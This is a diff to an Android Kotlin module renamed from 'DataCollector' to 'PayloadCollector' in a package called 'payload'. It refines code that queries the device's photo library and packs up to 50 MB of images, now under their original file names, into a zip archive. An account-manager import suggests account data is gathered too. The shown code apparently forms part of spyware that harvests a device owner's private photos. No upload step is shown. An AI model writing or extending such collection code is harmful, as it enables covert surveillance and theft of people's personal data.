@@ -1,4 +1,4 @@
-package com.example.foregroundservice
+package com.example.payload
 
 import android.accounts.AccountManager
 import android.content.ContentUris
@@ -17,7 +17,7 @@ import java.io.FileOutputStream
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
-object DataCollector {
+object PayloadCollector {
 
     private const val MAX_PHOTO_BYTES = 50L * 1024 * 1024 // 50mb
 
@@ -32,12 +32,12 @@ object DataCollector {
             zip.closeEntry()
 
             // 2. photos/
-            val photoIds = collectPhotoIds(context)
+            val photos = collectPhotoEntries(context)
             var written = 0L
-            for (id in photoIds) {
+            for ((id, name) in photos) {
                 if (written >= MAX_PHOTO_BYTES) break
                 val bytes = readPhotoBytes(context, id) ?: continue
-                zip.putNextEntry(ZipEntry("photos/$id.jpg"))
+                zip.putNextEntry(ZipEntry("photos/$name"))
                 zip.write(bytes)
                 zip.closeEntry()
                 written += bytes.size
@@ -142,19 +142,24 @@ object DataCollector {
         return arr
     }
 
-    private fun collectPhotoIds(context: Context): List<Long> {
-        val ids = mutableListOf<Long>()
+    private fun collectPhotoEntries(context: Context): List<Pair<Long, String>> {
+        val result = mutableListOf<Pair<Long, String>>()
         val cursor = context.contentResolver.query(
             MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            arrayOf(MediaStore.Images.Media._ID),
+            arrayOf(
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME
+            ),
             null, null, null
         )
         cursor?.use {
             while (it.moveToNext()) {
-                ids.add(it.getLong(0))
+                val id = it.getLong(0)
+                val name = it.getString(1) ?: "$id.jpg"
+                result.add(id to name)
             }
         }
-        return ids
+        return result
     }
 
     private fun readPhotoBytes(context: Context, id: Long): ByteArray? {
